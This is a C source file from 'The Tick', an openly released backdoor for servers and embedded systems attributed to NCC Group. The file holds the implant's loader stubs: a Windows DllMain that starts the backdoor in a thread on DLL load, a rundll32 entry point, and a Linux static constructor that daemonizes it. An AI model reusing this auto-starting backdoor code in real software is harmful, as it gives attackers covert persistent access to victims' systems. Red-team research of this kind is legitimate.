/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "libmain.h"

#include "command.h"

#ifdef _WIN32

DWORD WINAPI _stub_run(LPVOID lpParam);

// Windows version. Here we have a standard way of being called when we're loaded.
// However the state of the process may be quite unstable, depending on how
// the DLL was loaded. To be on the safe side, we create a background thread.
// The thread will be automatically locked until DLL initialization is complete.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved __attribute__((unused)))
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            CloseHandle(CreateThread(NULL, 0, &_stub_run, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

DWORD WINAPI _stub_run(LPVOID lpParam __attribute__((unused)))
{
    run(0, NULL);
    ExitThread(0);
}

// Entrypoint function for use with Rundll32.
#if TICK_RUNDLL_ENTRY_POINT
extern void CALLBACK TICK_RUNDLL_ENTRY_POINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    run(0, NULL);
    ExitProcess(0);
}
#endif

#else

// This gets called by the ELF loader since it
// registers itself as a static C++ constructor.
static void static_constructor(void)
{
    daemonize(0, NULL);
    return;
}

#endif
